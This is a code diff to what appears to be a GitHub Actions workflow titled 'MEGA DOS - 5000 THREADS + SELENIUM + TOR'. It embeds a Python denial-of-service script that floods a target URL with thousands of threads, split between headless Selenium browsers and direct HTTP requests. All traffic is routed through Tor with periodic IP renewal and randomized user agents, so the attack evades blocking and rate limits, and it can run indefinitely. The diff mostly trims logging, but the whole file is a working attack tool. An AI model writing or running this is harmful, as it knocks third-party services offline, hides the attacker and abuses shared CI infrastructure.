@@ -1,4 +1,4 @@
-name: 💀 MEGA DOS - 5000 THREADS + SELENIUM + TOR fixt
+name: 💀 MEGA DOS - 5000 THREADS + SELENIUM + TOR
 
 on:
   workflow_dispatch:
@@ -53,7 +53,6 @@ jobs:
               "blocked": 0,
               "timeout": 0,
               "ip_changes": 0,
-              "requests_per_second": 0
           }
           stats_lock = threading.Lock()
           running = True
@@ -93,8 +92,7 @@ jobs:
           # هجوم Selenium عبر Tor
           # ============================================
           def selenium_attack(worker_id):
-              global stats, running
-              
+              global running
               chrome_options = Options()
               chrome_options.add_argument('--headless')
               chrome_options.add_argument('--no-sandbox')
@@ -107,11 +105,11 @@ jobs:
               chrome_options.add_experimental_option('useAutomationExtension', False)
               
               ua = UserAgent()
-              chrome_options.add_argument(f'user-agent={ua.random}')
               
               while running:
                   driver = None
                   try:
+                      chrome_options.add_argument(f'user-agent={ua.random}')
                       driver = webdriver.Chrome(options=chrome_options)
                       driver.set_page_load_timeout(12)
                       driver.get(TARGET)
@@ -124,13 +122,13 @@ jobs:
                           stats["total"] += 1
                           if "Security" in title or "Challenge" in title:
                               stats["blocked"] += 1
-                              print(f"🚫 [{worker_id}] Challenge page: {title[:40]}")
+                              print(f"🚫 [{worker_id}] Challenge page")
                           elif "Error" in title or "502" in title or "503" in title:
                               stats["failed"] += 1
                               print(f"⚠️ [{worker_id}] Error: {title[:40]}")
                           else:
                               stats["success"] += 1
-                              print(f"✅ [{worker_id}] {current_url[:50]} → {title[:30]}")
+                              print(f"✅ [{worker_id}] OK")
                       
                       driver.quit()
                       
@@ -146,14 +144,10 @@ jobs:
                       with stats_lock:
                           stats["total"] += 1
                           stats["failed"] += 1
-                      if "ERR_CONNECTION_REFUSED" in str(e):
-                          print(f"🔴 [{worker_id}] Connection refused")
-                      else:
-                          print(f"❌ [{worker_id}] Driver error")
                       if driver:
                           driver.quit()
                           
-                  except Exception as e:
+                  except Exception:
                       with stats_lock:
                           stats["total"] += 1
                           stats["failed"] += 1
@@ -166,7 +160,7 @@ jobs:
           # هجوم curl عبر Tor (أسرع)
           # ============================================
           def curl_attack(worker_id):
-              global stats, running
+              global running
               session = None
               
               while running:
@@ -191,10 +185,10 @@ jobs:
                               print(f"⚡ [{worker_id}] 200 OK")
                           elif response.status_code == 429:
                               stats["blocked"] += 1
-                              print(f"🚫 [{worker_id}] 429 Rate Limited")
+                              print(f"🚫 [{worker_id}] 429")
                           elif response.status_code in [502, 503, 504]:
                               stats["failed"] += 1
-                              print(f"⚠️ [{worker_id}] {response.status_code} Server Error")
+                              print(f"⚠️ [{worker_id}] {response.status_code}")
                           else:
                               stats["failed"] += 1
                               print(f"❌ [{worker_id}] {response.status_code}")
@@ -204,6 +198,7 @@ jobs:
                           stats["total"] += 1
                           stats["timeout"] += 1
                       print(f"⏰ [{worker_id}] Timeout")
+                      session = None
                       
                   except requests.exceptions.ConnectionError:
                       with stats_lock:
@@ -224,14 +219,12 @@ jobs:
           # تشغيل الخيوط
           # ============================================
           def stats_printer():
-              global stats, running, start_time
+              global running, start_time
               last_total = 0
-              last_second = time.time()
               
               while running:
                   time.sleep(1)
-                  current_time = time.time()
-                  elapsed = current_time - start_time
+                  elapsed = time.time() - start_time
                   
                   with stats_lock:
                       total = stats["total"]
@@ -243,27 +236,23 @@ jobs:
                       rps = total - last_total
                       last_total = total
                   
-                  # حساب الوقت المتبقي
                   if DURATION_MINUTES > 0:
                       remaining = max(0, (DURATION_MINUTES * 60) - elapsed)
                       remaining_min = int(remaining // 60)
                       remaining_sec = int(remaining % 60)
-                      time_str = f"⏱️ Remaining: {remaining_min}m {remaining_sec}s"
+                      time_str = f"Remaining: {remaining_min}m {remaining_sec}s"
                   else:
-                      time_str = "♾️ Infinite mode"
+                      time_str = "Infinite mode"
                   
                   elapsed_min = int(elapsed // 60)
                   elapsed_sec = int(elapsed % 60)
                   
-                  # طباعة الإحصائيات
-                  print(f"\n{'='*70}")
-                  print(f"📊 [{elapsed_min:02d}:{elapsed_sec:02d}] {time_str}")
-                  print(f"   🔥 Total: {total:>8,} | ✅ Success: {success:>8,} | ❌ Failed: {failed:>8,}")
-                  print(f"   🚫 Blocked: {blocked:>8,} | ⏰ Timeout: {timeout:>8,} | 🔄 IP Changes: {ip_changes:>5}")
-                  print(f"   ⚡ RPS: {rps:>5}/s | 🧵 Threads: {THREADS}")
-                  print(f"{'='*70}")
+                  print(f"\n[{elapsed_min:02d}:{elapsed_sec:02d}] {time_str}")
+                  print(f"  Total: {total:>6,} | OK: {success:>6,} | Fail: {failed:>6,}")
+                  print(f"  Blocked: {blocked:>6,} | Timeout: {timeout:>6,} | RPS: {rps:>4}/s")
+                  print(f"  IP Changes: {ip_changes} | Threads: {THREADS}")
+                  print("-" * 50)
                   
-                  # تحقق من انتهاء الوقت
                   if DURATION_MINUTES > 0 and elapsed >= DURATION_MINUTES * 60:
                       global running
                       running = False
@@ -274,22 +263,22 @@ jobs:
           # الوظيفة الرئيسية
           # ============================================
           print("╔════════════════════════════════════════════════════════════════════╗")
-          print("║     💀 MEGA DOS - 5000 THREADS + SELENIUM + TOR + REAL-TIME 💀    ║")
+          print("║     💀 MEGA DOS - 5000 THREADS + SELENIUM + TOR 💀                ║")
           print("╚════════════════════════════════════════════════════════════════════╝")
           print("")
           print(f"🎯 Target: {TARGET}")
-          print(f"⏱️  Duration: {DURATION_MINUTES} minutes" if DURATION_MINUTES > 0 else "⏱️  Duration: INFINITE")
+          if DURATION_MINUTES > 0:
+              print(f"⏱️  Duration: {DURATION_MINUTES} minutes")
+          else:
+              print(f"⏱️  Duration: INFINITE")
           print(f"🧵 Threads: {THREADS}")
-          print(f"⚡ Power: SELENIUM (browser) + TOR (IP rotation) + CURL (fast)")
           print("")
           
-          # تشغيل Tor
           start_tor()
           
-          # تجديد IP كل 3 دقائق
           last_renew = time.time()
           
-          # تشغيل الخيوط (نصفها Selenium، نصفها Curl)
+          # تشغيل الخيوط
           threads = []
           for i in range(THREADS):
               if i % 2 == 0:
@@ -301,7 +290,6 @@ jobs:
               threads.append(t)
           
           print(f"🔥 {THREADS} threads launched!")
-          print("")
           
           # تشغيل عداد الإحصائيات
           printer_thread = threading.Thread(target=stats_printer)
@@ -311,30 +299,28 @@ jobs:
           # حلقة تجديد IP
           while running:
               time.sleep(60)
-              if time.time() - last_renew > 180:  # كل 3 دقائق
+              if time.time() - last_renew > 180:
                   renew_tor_ip()
                   last_renew = time.time()
           
-          # انتظار انتهاء الخيوط
-          print("\n🛑 Waiting for threads to finish...")
+          print("\n🛑 Waiting for threads...")
           for t in threads:
-              t.join(timeout=2)
+              t.join(timeout=1)
           
-          # الإحصائيات النهائية
           elapsed = time.time() - start_time
-          print("\n" + "="*70)
-          print("📊 FINAL STATISTICS:")
-          print(f"   Total time: {int(elapsed // 60)}m {int(elapsed % 60)}s")
-          print(f"   Total requests: {stats['total']:,}")
-          print(f"   Successful: {stats['success']:,}")
-          print(f"   Failed: {stats['failed']:,}")
-          print(f"   Blocked (429/Challenge): {stats['blocked']:,}")
-          print(f"   Timeouts: {stats['timeout']:,}")
-          print(f"   Tor IP changes: {stats['ip_changes']}")
+          print("\n" + "="*50)
+          print("FINAL STATISTICS:")
+          print(f"  Time: {int(elapsed//60)}m {int(elapsed%60)}s")
+          print(f"  Total: {stats['total']:,}")
+          print(f"  Success: {stats['success']:,}")
+          print(f"  Failed: {stats['failed']:,}")
+          print(f"  Blocked: {stats['blocked']:,}")
+          print(f"  Timeouts: {stats['timeout']:,}")
+          print(f"  IP Changes: {stats['ip_changes']}")
           if stats['total'] > 0:
-              print(f"   Success rate: {stats['success']/stats['total']*100:.1f}%")
-              print(f"   Average RPS: {stats['total']/elapsed:.1f}")
-          print("="*70)
+              print(f"  Success rate: {stats['success']/stats['total']*100:.1f}%")
+              print(f"  Avg RPS: {stats['total']/elapsed:.1f}")
+          print("="*50)
           EOF
           
           python3 mega_attack.py
